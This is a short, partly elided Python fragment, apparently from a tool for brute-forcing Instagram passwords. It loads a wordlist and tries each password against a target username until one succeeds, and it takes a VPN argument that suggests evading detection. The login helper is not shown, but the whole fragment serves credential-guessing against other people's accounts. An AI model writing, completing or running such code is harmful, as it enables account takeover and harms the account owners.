...
def insta_bruteforce(username, wordlist_file, vpn):
    spam_bool = 1
    c_spam = 0

    try:
        with open("wordlist/" + wordlist_file, 'r') as wl_file:
            wl_lines = [line.strip() for line in wl_file.readlines()]  # Remover caracteres de nova linha
    except FileNotFoundError:
        print("\n\nERROR 1x01: Wordlist not found. Please make sure the wordlist file is in the 'wordlist' folder.\n\n")
        return  # Retorna para evitar que o código continue executando se a wordlist não for encontrada
    ...
    for line in wl_lines:
        ...
        if insta_pass(username, line) == True:
            ...
            return  # Retorna após encontrar a senha correta
        else:
            os.system("cls")
